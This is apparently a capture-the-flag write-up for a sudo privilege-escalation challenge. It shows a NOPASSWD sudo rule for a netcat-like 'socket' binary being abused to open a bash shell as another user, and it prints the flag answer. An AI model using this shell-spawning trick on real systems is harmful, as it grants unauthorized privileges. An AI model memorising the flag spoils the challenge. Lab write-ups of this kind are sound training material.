when we spawn the instance of the chall the chall give us the basic credential

`ssh user@<instance> -p<port>` and the password is password123


`ls -la ..
total 20
drwxr-xr-x 1 root           root           4096 May 12 10:35 .
drwxr-xr-x 1 root           root           4096 May 14 13:33 ..
drwxr-x--- 1 privilegeduser privilegeduser 4096 May 12 10:35 privilegeduser
drwxr-x--- 1 user           user           4096 May 14 13:34 user

`
we see that there if  an other user who is privilegeduser.

`
sudo -l
Matching Defaults entries for user on sudoklu:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
    use_pty

User user may run the following commands on sudoklu:
    (privilegeduser) NOPASSWD: /usr/bin/socket

`
there is a way to use socket as privilegeduser without password 
and socket is just a rename of netcat so we can try to reverse shell it.
`
sudo -u privilegeduser /usr/bin/socket -Blv 127.0.0.1 1234 -p /bin/bash
`

and there is a shell on our other instance and we are privilegeduser and in the home of privilegeduser there is the flag.

`cat flag.txt
Hero{ch3ck_f0r_m1sc0nf1gur4t1on5}
`

Hero{ch3ck_f0r_m1sc0nf1gur4t1on5}

